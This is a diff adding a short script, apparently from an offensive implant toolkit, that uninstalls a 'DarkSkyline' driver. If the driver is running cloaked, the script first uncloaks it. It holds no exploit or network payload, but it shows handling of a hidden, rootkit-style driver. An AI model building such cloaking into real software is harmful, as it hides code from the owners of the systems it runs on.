@@ -1,0 +1,55 @@
+#--------------------------------------------------------
+# File: Uninstall.eps
+#
+# Wrapper script for Uninstall of DarkSkyline tools
+#
+# Modifications:
+#  11/18/2002	Created.
+#  02/03/2004	Updated to use DriverIncludes
+#--------------------------------------------------------
+@include "_DriverIncludes.epm";
+@include "cloak.eps";
+@include "getResDir.eps";
+
+@echo off;
+
+if ($argc != 3) {
+    echo "Usage: $argv[0] <driverName> <cloaker>";
+    return false;
+}
+
+string $driver = $argv[1];
+string $cloaker = $argv[2];
+
+string $resPath;
+getResDirectory($resPath);
+
+echo "**************************************************";
+echo " PRE-UNINSTALL STEPS";
+echo "**************************************************";
+
+ifnot(`script VerifyInstall.eps $driver $cloaker`){
+  echo " ERROR: Could not verify installation";
+  echo "**************************************************";
+  return false;
+}
+
+if(`script VerifyRunning.eps $driver $cloaker`){
+  echo "  Driver is running and cloaked";
+  echo "   Decloaking...";
+  ifnot(cloakIt($argv[2], $resPath, "uncloak")) {
+    echo "EP couldn't gain uncloaked privileges";
+    return false;
+  }
+}
+else{
+  echo "  Driver is not running";
+  echo "   Ignore messages about stopping driver failing";
+}
+
+echo "**************************************************";
+
+
+
+
+return _DriverUninstall($driver);
